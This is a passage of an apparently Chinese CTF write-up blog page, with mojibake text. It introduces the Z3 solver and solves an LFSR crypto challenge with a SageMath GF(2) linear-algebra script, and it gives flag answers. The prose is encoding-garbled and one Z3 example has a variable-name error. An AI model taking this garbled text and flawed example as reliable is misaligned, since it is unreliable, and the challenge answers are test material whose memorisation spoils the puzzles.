number">101</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">]</span></code></pre><p>è€Œååˆ©ç”¨ <code>chr</code> æŠŠæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦å³å¯å¾—åˆ° flagã€‚</p><p><code>flag{7e171d43-63b9-4e18-990e-6e14c2afe648}</code></p><hr><h2 id="Z3-Introduction"><a href="#Z3-Introduction" class="headerlink" title="Z3 Introduction"></a>Z3 Introduction</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><blockquote><p>Z3 is a theorem prover from Microsoft Research. It is licensed under the MIT license.</p><p>If you are not familiar with Z3, you can start <a href="https://github.com/Z3Prover/z3/wiki#background">here</a>.</p><p>Pre-built binaries for stable and nightly releases are available from <a href="https://github.com/Z3Prover/z3/releases">here</a>.</p><p>Z3 can be built using <a href="https://github.com/Z3Prover/z3#building-z3-on-windows-using-visual-studio-command-prompt">Visual Studio</a>, a <a href="https://github.com/Z3Prover/z3#building-z3-using-make-and-gccclang">Makefile</a> or using <a href="https://github.com/Z3Prover/z3#building-z3-using-cmake">CMake</a>. It provides <a href="https://github.com/Z3Prover/z3#z3-bindings">bindings for several programming languages</a>.</p><p>See the <a href="https://github.com/Z3Prover/z3/blob/master/RELEASE_NOTES">release notes</a> for notes on various stable releases of Z3.</p></blockquote><blockquote><p>Z3 åœ¨å·¥ä¸šåº”ç”¨ä¸­å®é™…ä¸Šå¸¸è§äºè½¯ä»¶éªŒè¯ã€ç¨‹åºåˆ†æç­‰ã€‚ç„¶è€Œç”±äºåŠŸèƒ½å®åœ¨å¼ºå¤§ï¼Œä¹Ÿè¢«ç”¨äºå¾ˆå¤šå…¶ä»–é¢†åŸŸã€‚CTF é¢†åŸŸæ¥è¯´ï¼Œèƒ½å¤Ÿç”¨çº¦æŸæ±‚è§£å™¨æå®šçš„é—®é¢˜å¸¸è§äºå¯†ç é¢˜ã€äºŒè¿›åˆ¶é€†å‘ã€ç¬¦å·æ‰§è¡Œã€Fuzzing æ¨¡ç³Šæµ‹è¯•ç­‰ã€‚æ­¤å¤–ï¼Œè‘—åçš„äºŒè¿›åˆ¶åˆ†ææ¡†æ¶ <a href="http://angr.io/">angr</a> ä¹Ÿå†…ç½®äº†ä¸€ä¸ªä¿®æ”¹ç‰ˆçš„ Z3ã€‚</p></blockquote><p>GitHub repo: <a href="https://github.com/Z3Prover/z3">https://github.com/Z3Prover/z3</a></p><p>Z3 - Slides:  <a href="https://github.com/Z3Prover/z3/wiki/Slides">https://github.com/Z3Prover/z3/wiki/Slides</a></p><p>Z3 - guide ( English ): <a href="https://rise4fun.com/z3/tutorialcontent/guide">https://rise4fun.com/z3/tutorialcontent/guide</a></p><p>Z3 API/å‡½æ•°æ¥å£: <a href="http://z3prover.github.io/api/html/index.html">http://z3prover.github.io/api/html/index.html</a></p><p>ï¼ˆ<a href="http://z3prover.github.io/api/html/namespacez3py.html">Python çš„ Z3 æ¥å£æ–‡æ¡£</a>ï¼Œ<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">guide-examples</a>ï¼‰</p><p>æ®è¯´å®ƒå¯ä»¥è§£å†³æ‰€æœ‰çš„æ–¹ç¨‹ï¼Œå½“ç„¶å¦‚æœæœ‰è§£çš„è¯ã€‚æ„Ÿè§‰å°±è´¼å¼ºå¤§ã€‚</p><p><em>å¾®è½¯çˆ¸çˆ¸è¿˜æ˜¯å¼ºå•Šï¼ˆ</em></p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>è¿™é‡Œå°±ä»¥ python3 ä¸ºä¾‹äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> z3-solver</code></pre><p>æ³¨æ„è¿™é‡Œä¸æ˜¯ <code>pip install z3</code>ï¼ï¼ï¼<em>ï¼ˆæ˜¯æˆ‘äº†å˜¤å˜¤å˜¤ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ pip é‡Œçš„ z3 æ˜¯ä»€ä¹ˆç©æ„</em></p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><strong>ä¸‰æ­¥èµ°ï¼š</strong></p><ol><li>å®šä¹‰æœªçŸ¥é‡</li><li>æ·»åŠ çº¦æŸæ¡ä»¶</li><li>æ±‚è§£</li></ol><p><strong>æ³¨æ„ï¼šå¦‚æœæ–¹ç¨‹æœ‰å¤šç»„è§£ï¼Œz3 åªä¼šç»™å‡ºå…¶ä¸­çš„ä¸€ç»„è§£ï¼Œå› æ­¤å¯ä»¥å°è¯•ä¸ºæ–¹ç¨‹æ·»åŠ çº¦æŸæ¡ä»¶ï¼Œè¿›ä¸€æ­¥é™åˆ¶è§£çš„èŒƒå›´ï¼Œä»è€Œè·å¾—é¢„æœŸçš„ä¸€ç»„è§£</strong></p><p><strong>Example:</strong></p><p>é¦–å…ˆçœ‹æœ€ç®€å•çš„ä¾‹å­ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>x <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>y <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>solve<span class="token punctuation">(</span>x <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">,</span> x <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>y <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œå¾—åˆ°</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> x <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">]</span></code></pre><p>å†æ¥çœ‹ç¨å¾®å¤æ‚ä¸€ç‚¹çš„ã€‚</p><p>å˜é‡ç±»å‹å¸¸ç”¨çš„åŒ…æ‹¬ Intå‹ï¼ˆæ•´æ•°ï¼‰ï¼ŒRealå‹ï¼ˆæœ‰ç†æ•°ï¼‰ï¼ŒBitVecå‹ï¼ˆä½å‘é‡ï¼‰ã€‚</p><p>è§£å¸¸ç”¨çš„æ–¹ç¨‹ä¸€èˆ¬æ˜¯ç”¨ Intå‹ï¼Œåœ¨æ±‚è§£ä½è¿ç®—ï¼ˆå¦‚<code>&amp;</code>, <code>^</code>, <code>|</code>, <code>&gt;&gt;</code>, <code>&lt;&lt;</code> è¿™äº›ï¼‰ç”¨ BitVecå‹å°±å¾ˆæ–¹ä¾¿ï¼ŒåŒ…æ‹¬ä¸‹é¢çš„ LFSR ä¹Ÿå¯ä»¥ç”¨åˆ°ã€‚</p><p>æ±‚è§£æ–¹ç¨‹ç»„çš„è¯ï¼Œéœ€è¦å…ˆåˆå§‹åŒ–ä¸€ä¸ª<code>Solver</code>ï¼ˆçº¦æŸæ±‚è§£å™¨ï¼‰ï¼Œ</p><p>ç„¶ååˆ©ç”¨ <code>add</code> æ–¹æ³•ä¾æ¬¡å¾€é‡Œé¢åŠ å…¥æ–¹ç¨‹ã€‚</p><p>å…¶æ¬¡åˆ¤æ–­è§£æ˜¯å¦å­˜åœ¨<br> <code>if solver.check() == sat:</code> </p><p>æœ€åæ±‚è§£<br> <code>print(solver.model())</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token operator">=</span> Ints<span class="token punctuation">(</span><span class="token string">'x y z'</span><span class="token punctuation">)</span>  <span class="token comment"># å¯ä»¥åŒæ—¶å®šä¹‰å¤šä¸ªå˜é‡</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'EQU1'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'EQU2'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'EQU3'</span><span class="token punctuation">)</span><span class="token keyword">if</span> solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>è¿™é“é¢˜é‡Œå°±ç”¨äº†è¿™ä¸€æ–¹æ³•æ¥æ±‚è§£ã€‚</p><p>å¤§æ¦‚å…ˆå†™è¿™ä¹ˆå¤šï¼Œå…¶ä»–çš„è¿˜å¾—æ…¢æ…¢å­¦ï¼Œå¯ä»¥å‚è€ƒä¸‹æœ€åçš„æ‹“å±•é˜…è¯»å–µ~</p><hr><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>é¢˜ç›®æ‰€ç»™ä»£ç å¦‚ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> secret <span class="token keyword">import</span> flagN <span class="token operator">=</span> <span class="token number">100</span>MASK <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> mask<span class="token punctuation">)</span><span class="token punctuation">:</span>    feedback <span class="token operator">=</span> state <span class="token operator">&amp;</span> mask    feed_bit <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>feedback<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>    output_bit <span class="token operator">=</span> state <span class="token operator">&amp;</span> <span class="token number">1</span>    state <span class="token operator">=</span> <span class="token punctuation">(</span>state <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>feed_bit <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>N<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> state<span class="token punctuation">,</span> output_bit<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"flag{"</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span>    mask <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> mask<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> N        state  <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MASK<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>        outputs <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        state<span class="token punctuation">,</span> output_bit <span class="token operator">=</span> lfsr<span class="token punctuation">(</span>state<span class="token punctuation">,</span> mask<span class="token punctuation">)</span>        outputs <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>output_bit<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>outputs<span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿™é¢˜è®©æˆ‘æƒ³èµ·äº†è¿™å­¦æœŸå«æ˜Ÿå¯¼èˆªè¯¾åšçš„å®éªŒï¼Œè®©æˆ‘ä»¬åˆ©ç”¨ä¸åŒæŠ½å¤´çš„ç§»ä½å¯„å­˜å™¨ç”Ÿæˆä¼ªéšæœºåºåˆ—ï¼Œè¿˜æœ‰måºåˆ—ä»€ä¹ˆçš„ã€‚</p><blockquote><p>måºåˆ—æ˜¯æœ€é•¿çº¿æ€§ç§»ä½å¯„å­˜å™¨åºåˆ—çš„ç®€ç§°ï¼Œæ˜¯ä¸€ç§ä¼ªéšæœºåºåˆ—ã€ä¼ªå™ªå£°(PN)ç æˆ–ä¼ªéšæœºç ã€‚å¯ä»¥é¢„å…ˆç¡®å®šå¹¶ä¸”å¯ä»¥é‡å¤å®ç°çš„åºåˆ—ç§°ä¸ºç¡®å®šåºåˆ—ï¼›æ—¢ä¸èƒ½é¢„å…ˆç¡®å®šåˆä¸èƒ½é‡å¤å®ç°çš„åºåˆ—ç§°éšæœºåºåˆ—ï¼›ä¸èƒ½é¢„å…ˆç¡®å®šä½†å¯ä»¥é‡å¤äº§ç”Ÿçš„åºåˆ—ç§°ä¼ªéšæœºåºåˆ—ã€‚</p><p>å®ƒæ˜¯ç”±å¸¦çº¿æ€§åé¦ˆçš„ç§»å­˜å™¨äº§ç”Ÿçš„å‘¨æœŸæœ€é•¿çš„åºåˆ—ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªnçº§çº¿æ€§åé¦ˆç§»å­˜å™¨å¯èƒ½äº§ç”Ÿçš„æœ€é•¿å‘¨æœŸç­‰äº(2^n -1)ã€‚</p><p>åœ¨é€šä¿¡é¢†åŸŸæœ‰ç€å¹¿æ³›çš„åº”ç”¨ï¼Œå¦‚æ‰©é¢‘é€šä¿¡ã€å«æ˜Ÿé€šä¿¡çš„ç åˆ†å¤šå€ï¼ˆCDMAï¼‰ï¼Œæ•°å­—æ•°æ®ä¸­çš„åŠ å¯†ã€åŠ æ‰°ã€åŒæ­¥ã€è¯¯ç ç‡æµ‹é‡ç­‰é¢†åŸŸã€‚</p><p><em>Via Baidu baike</em></p></blockquote><blockquote><p><strong>çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨</strong>ï¼ˆlinear feedback shift register, <strong>LFSR</strong>ï¼‰æ˜¯æŒ‡ï¼Œç»™å®šå‰ä¸€çŠ¶æ€çš„è¾“å‡ºï¼Œå°†è¯¥è¾“å‡ºçš„çº¿æ€§å‡½æ•°å†ç”¨ä½œè¾“å…¥çš„ç§»ä½å¯„å­˜å™¨ã€‚å¼‚æˆ–è¿ç®—æ˜¯æœ€å¸¸è§çš„å•æ¯”ç‰¹çº¿æ€§å‡½æ•°ï¼šå¯¹å¯„å­˜å™¨çš„æŸäº›ä½è¿›è¡Œå¼‚æˆ–æ“ä½œåä½œä¸ºè¾“å…¥ï¼Œå†å¯¹å¯„å­˜å™¨ä¸­çš„å„æ¯”ç‰¹è¿›è¡Œæ•´ä½“ç§»ä½ã€‚</p></blockquote><p>å½“æ—¶ç”±äºNè¾ƒå°ï¼Œç›´æ¥å°±ç”¨åˆ—è¡¨æ¥å†™äº†ï¼Œå°±æ˜¯æœ‰ç‚¹ä¸‘ï¼Œåæ¥æƒ³æƒ³å¯ä»¥ç”¨ç§»ä½æ¥å®ç°ã€‚çœ‹äº†é¢˜ç›®é‡Œé¢çš„ <code>def lfsr(state, mask)</code> è¿™ä¸€å‡½æ•°ï¼Œå‘ç°å†™çš„å°±å¾ˆå¦™å•Šã€‚</p><p>å½“ç„¶è¿˜æœ‰è¿™æ ·çš„<em>ï¼ˆ2018 å¼ºç½‘æ¯ streamgame1ï¼Œ2018 å›½èµ› oldstreamgameï¼‰</em></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> <span class="token punctuation">(</span>R <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span>    i<span class="token operator">=</span><span class="token punctuation">(</span>R<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffff</span>    lastbit<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>        lastbit<span class="token operator">^</span><span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>        i<span class="token operator">=</span>i<span class="token operator">&gt;&gt;</span><span class="token number">1</span>    output<span class="token operator">^</span><span class="token operator">=</span>lastbit    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">,</span>lastbit<span class="token punctuation">)</span></code></pre><p>è¯è¯´å›æ¥ï¼Œå¯¹äºè¿™é¢˜è€Œè¨€ï¼Œåˆ†æå¯çŸ¥ï¼Œflag æ‹¬å·å†…çš„å­—ç¬¦æ˜¯äºŒè¿›åˆ¶ä½æ•°ä¸º100ä½çš„æ•´æ•°ã€‚è€ƒè™‘åˆ°è¿™é¢˜æŠŠ flag ä½œä¸º mask è€Œä¸æ˜¯åˆå§‹çš„çŠ¶æ€ stateï¼Œä¸”åˆå§‹ state æ˜¯éšæœºç»™å®šçš„æ•´æ•°ï¼ŒLFSR å¾—åˆ°çš„ä¼ªéšæœºåºåˆ—æœ€å¤§é‡å¤å‘¨æœŸä¸º $2^{100}-1$ï¼Œçˆ†ç ´æ±‚è§£æ— æ³•è§£å‡ºã€‚</p><p>åˆ†æ LFSR çš„é€»è¾‘å¯çŸ¥ï¼Œlfsr å‡½æ•°å†…çš„è¾“å‡ºä½ $output bit = m_0x_0 + m_1x_1 + â€¦ + m_{99}x_{99}$ï¼ˆæ¨¡äºŒå’Œï¼‰ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªçº¿æ€§çš„æ–¹ç¨‹ï¼Œäºæ˜¯å¯ä»¥é€šè¿‡æ±‚è§£100ä¸ªæ–¹ç¨‹å¾—åˆ°å¯¹åº”çš„ç³»æ•°mï¼Œä¹Ÿå°±å¾—åˆ°äº† flagã€‚</p><p><strong>Exp</strong></p><pre class="language-python" data-language="python"><code class="language-python">output <span class="token operator">=</span> <span class="token string">"0100110011101111011111011010100111001010010100001111110110111101011110011111010010010111011100110111011001100001010010011101101000110110000011111011110000010100001001000011001011011011011001111110101111001010011011100010011110101100100101111001011100011110111101001010000000100100000111100101100100100000100110001111110011100110101000110100011001110110000110111111010111000001101110011001101111010110101000101011110111001011001111111000100100100011100100010101001100111011101111100110101011101101001001110010111011010011111001100001111111100001000001101101000001010100110011001101000101001010001001011000010111111100101111000000101000010110100110101001001100100011000111101000110011110101101111100110101010101000000001110010101001001111101001010111011110110001100101001111110111000110101011011010110101100011110010000011000110010111101010010000011101110111100011011110110001111010101011101100101101001111100100011000100101111011110001111100000110111000111111000111100000110011011011111110011111100010010110000010011100001010101011011101100011001100101100011001010010001101010011000000011110110111000000110001010010111110101011100000010100100001101011010101100110000101100010001010010111011000100001000001001110101011000010111000000010101100001010000010110110000111100011011000010111001111101110111010110000011001011101100000100000100010100100000010011010000111110010001111010000100011110000101111000110100010110101110001011101101100111000001110100100000000010011001110101110000001101100000001010111010011111000101101011001010011001101000111000010111111010101000011011001001110000011100100100010110101100001110110111001000001011111100101100011010010010110000011110100110000111011011010101110101001100110100101100101000100011001011000001011110010000011000110111011110011010001101100010010111110101101101110100111010000001101000011011010011110111101000000100011000000101001000000011010101010000100001110110000110011000111101011100100101111101111111110101000011010001101100010010100111000000010000101100100110101000001001011100011111001101001101100010100000111010101111011101111111101100000010000111110011101010100101110100101010100011110100100000111010001000100011010011100010011000001110110100110110010100100110111011001010010010100000110101110000011110010110100010101000110000111101011011010111101100111100101001101001101100111101000100101101100010111010010111100100111101101110101110011010110011111011111010000011000100010010101110001001000111111100100010100000001001010111010100010111001011011101110010110111110110100011111101110111011000111001010010110001001011011100110101111100100000101110000001011110011101110101101001011111100011001100111001011011001011011101000101100100011101000011101011010110010111111010011110111111111100001101101001101101111000100110010010100000100000100110100100110010000100101100000101010101000111110101001111111011011111101101110010100110000010110111001101110011101100001111111001110110010010011101111100111111000010011010010011100000001010011111111110001111110110110110001001001111011001101110110101100011010001111110010001011010000011110101100110010010001110010100010000000010101010010111011010101011011000010010011010110101101011100100101110001100000111110010101100010100010100010000101111000011111000111000011110001110110000011000100110010101111111111100011010000010010010111111110000000010100100101101101010111011000001010000000101011010110011101000110011011001110101101001001101100010011110001101001001000011001101100001101100000101111000001110100001100001000100000000011010011001001011110011000011011000100011011001011100111111000011011010000100000011110110011011110111000001011101101110110101000101011111110000100000111111110011111111100010101001000011010001110111111011100010111001110110001000101010001001001111111110111001101001001000110000110100000000010010100001010111101001110001011101011000100000001001001011111000100011111000011010001110001111111110111100010001110101011101011100010100000011110000100011001100000100111000111011011101000110010011010011110010010000111010001011111111010110011100111011110100111000101100100111001001010001000100011110101100100010000000000110010111101101111101011001101111000000000100000101001011110000010011110011000000100111001001110001000010011111010100001001010010100111111010111001001110110101010010100010010100101100000001010010111101101000110100111110000000111110000011110011001101010111101010111010111010000000110010001011110101110110001000110111101110101101001001100001101110001000100000110100000100000111110010110110010011111100010011111001110111011010101010001011111110000000011110001010011001101010110010101100101100110010111001100100111101000100010100010010100000010010111101100111110101101111101001010110010001111111001101010111110101111001000111101001110100000111111010000111000010101001001101100111001111111111100011010111110001101000100001010000000001101101001110001000001110010000010110001001001101010111111001001010100011011111011000011001001101000110010101000010100001001000011111001101101111011111001000010010111011010110010011010101100100000101100110110011011110000110011000000001011000111100101000011011011010010111000110101110101111100100010101010101000011000111000010001001000100110101111001001001111100110000101100010011101100001000010100010101110001111110101100101000101110000110010100101100101100101100100111111010100101010011100110100011111001000100010001101111111101011110100111001110101001101000010001011000111101110001010100101101111000110101001011101110110110110110101011010001110011111011110011010100110100111111010101111101111100110000110010111110110100110000011110110111111101111010011010000101010111100001111110110000001000001000011101001010010100100100000001101011101110011001011011110010111101111101010011010000110110101000100010110110101101010110110010011010011111111100001001000110111101001111000011001000010111100110001110110011011011100101011010101100011001111111000100000011100110011001001011000100010110000100001100011010000110110011100000111000010001011010001110010101000100010001001110001011001010000111010010101110001010100011101101110010111100010110010000011010111001101000100111011010100001010011100000100001010100010110100111000000001111100000100011100101011011101111111101101110011111010000110111101000001001110111000001000101100110100100111100100011011100010011111101010001101010100101110000110011000100001111100100001000000100011101101011011111000011110010110110101010011101000001111001011100101001001101111000011110000001010011010001110000111001101100011110011001100000111101001011000110111011001101101101100101100110100101011111111110110000111101000000100101011100111001111111011010100110010001000001101010001110010010000101111000001010100000101100000010101110100000000110011001011000011101101000000100111111010111110100011111101100001001110001100101100001010000100000110111101001101010000011100000000100000101101010010101111101100110110111000011100111001010010100101000111011001001110011111100010010010110100111101100110110111001011110010000111011111010101000010001101110011111010110011100010001111111011100110100011110110001101001110001010001110011110101111101011101100000111011011101110000110111101010001000011110011011101100011100101110100000100010110110011010101011000010010110000000100010011001110010011110010110111001111011010101111011000000111110000011011100100010011110010110000001111110111000100111010100110010111100010000110101011110011010110011001011011010010111001000000000001001010101010001100000110111101000000010100100010100101011111110011011100111101001110101010001100000100100110111110001111000011100010110001101101010011001011111101011000110110000111111101100000000001000010010010011101001000111100000010111011011001001100110000101010110001011000001011010111000111100111011010101010011100100100100010000001101001101010111110010100101000001100111110111111110000101111100110001110111010111001111110111100000111011011010111011001111010100010000111011111111000100110110001100000110101000001010010010100111011100000011111110001000010011010101001111010111100011110110110111000000111101010110001100000100001101101001101010111110001101101100101101101001000100000100110111111010011010011111010110110111101001000100010111101100011010111011111010011110000100001100101101111110010101000000101111101000001111110100000001011011111111100100110101101011100101101001011010001100010101101100000101000001110110101010100001011100010000111010011101110000000010000000000010111100111000010000000110110011011101110000001111011100011101111100011000011001000100111010101011010101110011010011011011010100011011000110111101001110011110000100010011000010000001101010010011000111000000000101100011010001000100010100100100011000101110100010001111101001010100001000000110010011101011101000000100010000011010110100111110101110001111001000000101011101010111110110100100011010000011010111111001001111101101110111110111000001010111100010001001001100000000110011100001100100111010011111011001010001101111111000010110101000011100001010110100101110111001001100000000110110101011001110000011001111100001101110100101101111100110001010011011001010110111000100010000110001111101110011100001101000100110000111000110001011011110100010101011011001001111101001110011100001110001010100011001110110101101001101010101001110011110001011101011100100001101100110110110101011101010110011100000001011010111011101000000101110111110010000000000101001110011111011001110001100010111001010010110011100001000011111101111101100111000101011100011000001100000000000010000111111010010101110101011100010100001000000100111111010111110010010111010110010100111000010111100000000100010111010010011010011001100010001000001100110100101110100110110111101010001100001010011111011100000010110110110000000100101100110100101100111001010100010001011010001010011110100110101000110001110000100111111001000110011110010111000110010001111111111101011110100111101001001101110110011111000110010111000011011111001110101101101000011010101011010111101011101111011100101001111111000101100100000011000100101001011001011110001101001100101001"</span>flist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> output<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        f<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    flist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span>C <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flist<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>F <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flist<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sol <span class="token operator">=</span> F<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>C<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sol<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token 